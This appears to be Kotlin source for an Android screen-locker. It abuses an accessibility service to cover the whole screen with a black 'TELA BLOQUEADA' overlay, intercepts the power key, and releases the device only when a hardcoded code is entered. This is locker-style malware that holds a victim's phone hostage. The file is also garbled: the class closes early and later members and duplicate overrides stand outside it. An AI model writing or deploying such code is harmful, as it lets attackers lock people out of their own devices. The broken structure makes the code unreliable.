package com.yzrak.gen

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.KeyEvent
import android.view.ViewGroup
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.*

class BlockAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {}
    override fun onInterrupt() {}
}

    companion object {
        const val OK = "cyyyyyy888787585785"
    }

    private lateinit var wm: WindowManager
    private var root: FrameLayout? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        }
        showOverlay()
    }

    private fun showOverlay() {
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val ps = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }

        val tv = TextView(this).apply {
            text = "⚠️ AVISO YZKRAK  ⚠️\nTELA BLOQUEADA!\nDigite o código:"
            setTextColor(Color.WHITE); gravity = Gravity.CENTER; textSize = 20f
        }
        val ed = EditText(this).apply {
            hint = "código"; setTextColor(Color.WHITE); setHintTextColor(Color.GRAY)
        }
        val bt = Button(this).apply {
            text = "OK"
            setOnClickListener {
                if (ed.text.toString() == OK) {
                    root?.removeAllViews()
                    root?.addView(TextView(this@BlockAccessibilityService).apply {
                        text = "✅ LIBERADO"; setTextColor(Color.GREEN); textSize = 24f; gravity = Gravity.CENTER
                    })
                    Handler(Looper.getMainLooper()).postDelayed({
                        disableSelf(); wm.removeView(root)
                    }, 1500)
                } else {
                    ed.setText("")
                    Toast.makeText(this@BlockAccessibilityService, "Código errado!", Toast.LENGTH_SHORT).show()
                }
            }
        }

        root?.addView(tv); root?.addView(ed); root?.addView(bt)
        wm.addView(root, ps)
    }

    override fun onKeyEvent(event: KeyEvent): Boolean =
        if (event.keyCode == KeyEvent.KEYCODE_POWER) true
        else super.onKeyEvent(event)

    override fun onAccessibilityEvent(event: AccessibilityEvent) {}
    override fun onInterrupt() {}
}
